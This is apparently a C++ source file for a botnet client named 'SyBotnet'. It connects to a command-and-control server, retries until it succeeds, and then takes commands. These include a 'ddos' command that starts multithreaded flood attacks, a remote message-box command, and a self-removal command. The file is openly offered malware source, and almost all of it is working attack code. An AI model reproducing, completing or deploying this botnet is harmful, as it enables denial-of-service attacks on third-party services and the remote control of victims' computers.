/* =============================================== */
/* |  Name: SyBotnet --------------------------- | */
/* |  Decription: Using SyOKet Library           | */
/* |  Copyright: Copyright 2021 SeungYup26       | */
/* |  Github: SeungYup - @SeungYup26             | */
/* =============================================== */

#include"flood.h"

#include<iostream>
#include<thread>
#include<cstring>

using namespace std::chrono;
using namespace std::chrono_literals;

TCPSocket tcp = TCPSocket("127.0.0.1", 2626);

int main()
{
	while (tcp.Connect() == E_CONNECT) std::this_thread::sleep_for(seconds(1));

	while (true)
	{
		Data data = { 0 };

		tcp.Recv(reinterpret_cast<char*>(&data), sizeof(Data));

		if (strcmp(data.command, "del") == 0)
		{
			tcp.Close();
			break;
		}

		else if (strcmp(data.command, "ddos") == 0)
		{
			for (int i = 0; i < data.thread; i++) {
				std::thread(flood, data).detach();
			}
		}

		else if (strcmp(data.command, "msgbox") == 0)
		{
			MessageBoxA(0, data.first_option, data.second_option, 0);
		}
	}

	return 0;
}